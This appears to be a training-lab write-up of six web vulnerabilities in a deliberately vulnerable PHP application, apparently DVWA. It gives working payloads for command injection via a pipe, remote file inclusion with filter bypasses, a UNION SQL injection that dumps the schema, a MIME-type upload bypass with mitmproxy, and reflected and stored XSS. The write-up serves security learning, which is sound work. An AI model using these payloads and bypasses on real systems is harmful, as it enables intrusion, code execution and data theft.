Vulnerability 1: Command Execution

This one can be exploited by simply using a pipe "|" after completing the ping input and writing any 
desired command to be runned on the server machine, bypassing the replace that only considers
 && and || command concatenations.
For example:
Inputing the following string on the textbox:

	10.0.23.15 | ls 

List what is inside the directory that the php file is

From that, you are able to run any command you want.

Vulnerability 2: File Inclusion

This vulnerability can be used to run any desired code in the server. The code has a replace 
to try to prohibit the user of adding external files, but you can bypass that replace simply 
changing the case of your string "HtTp://www..." or adding the replaced string inside itself 
"hhttp://tt://www...".
For example:
Assuming a file containing a phpinfo() command called phpinfo.php exists in the domain www.myphpinfo.com.
Acessing the URL:

	http://10.0.23.21/vulnerabilities/fi/?page=hhttp://ttp://www.myphpinfo.com/phpinfo.php

Executes a phpinfo() inside the server, showing every server info known by the php daemon.

From that, you are able to run any php code desired.

Vulnerability 3: SQL Injection (Blind)

This vulnerability can be exploited by injecting a union alongside the original command to retrieve additional information from the database. Using a union to get the information bypass the mysql_real_escape_string 
execution to sanitize user input.
For example, inputting:

	1 union SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS

Returns the name of every table and column on the database. From this, you can query any information desired from the database by 
creating a similar query using union.

Vulnerability 4: File Upload

This vulnerability can be exploited by changing the Mime Type on the request before sending it to the server, and tricking it to accept any
file format, as long as the code thinks it is a jpeg. This can be achieved, for example, by running the web browser through a proxy, and 
running mitmproxy like this
	
	mitmproxy -s phpuploader.py

To replace any php file Mime Type to a jpeg Mime, and with this you can upload and run any php code desired in the server.

Vulnerability 5: Reflected Cross Site Scripting (XSS)

This vulnerability can be exploited by injecting a script via the name textbox. To bypass the "<script>" replace, you can just change the case
or write the text inside itself like vulnerability 2, or add more parameter to the script tag, like <script data-something="" >.
For example, injecting:

	</pre><ScripT>alert("hacked")</script><pre>

Displays the alert on the browser, and generates the link

	http://10.0.23.21/vulnerabilities/xss_r/?name=%3C%2Fpre%3E%3CScripT%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%3Cpre%3E#

That can be sent to another person, and anyone that click on it will have this script automatically executed on his browser.
From that, you can cook a URL to execute any script you want in the target's browser.

Vulnerability 6: Stored Cross Site Scripting (XSS)

In this you can use the same tricks from the last one to bypass replaces, but the script has to be injected on the name, as the message 
goes through the htmlspecialchars() function, and get all the special characters replaced to escaped ones. To inject a bigger script, you
can increase the length of the name field by modifying the maxlength property with the inspector, as the limit is only imposed by the webpage 
itself, and not the backend code nor the database.
For example, increasing the maxlength and inputing:
	
	<ScripT>alert("hacked")</script>

Will get this script stored in the database and run to everyone that access the page.
From that, you can inject any javascript desired.